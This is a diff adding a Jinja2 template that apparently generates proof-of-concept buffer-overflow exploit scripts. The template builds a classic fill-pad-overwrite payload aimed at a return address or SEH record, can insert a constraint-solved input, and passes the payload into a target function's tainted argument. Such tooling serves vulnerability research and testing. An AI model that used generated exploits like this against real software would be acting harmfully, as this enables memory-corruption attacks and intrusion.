@@ -1,0 +1,33 @@
+{% extends "poc/base.py.j2" %}
+
+{% block description %}Buffer overflow in {{ sink_api }}{% endblock %}
+
+{% block config %}
+BUFFER_SIZE = {{ buffer_size }}
+OVERFLOW_PAD = {{ overflow_pad | default(8) }}
+{% endblock %}
+
+{% block payload %}
+# Overflow payload
+payload = b'A' * BUFFER_SIZE          # Fill buffer
+payload += b'B' * OVERFLOW_PAD        # Padding to target
+payload += b'CCCCCCCC'                # Overwrite target (return addr/SEH/etc)
+{% if solved_input %}
+# From constraint solving:
+# payload = {{ solved_input | repr }}
+{% endif %}
+{% endblock %}
+
+{% block exploit_doc %}Execute buffer overflow exploit{% endblock %}
+
+{% block exploit_body %}
+        print(f"[*] Sink API: {{ sink_api }}")
+        print(f"[*] Buffer size: {BUFFER_SIZE} bytes")
+        print(f"[*] Payload size: {len(payload)} bytes")
+
+        print("[*] Triggering buffer overflow...")
+        # 使用参数构建器，payload 放在污染参数位置
+        args = arg_builder.build(payload, payload_arg_idx={{ tainted_arg | default(0) }})
+        result = func(*args)
+        print(f"[+] Function returned: {result}")
+{% endblock %}
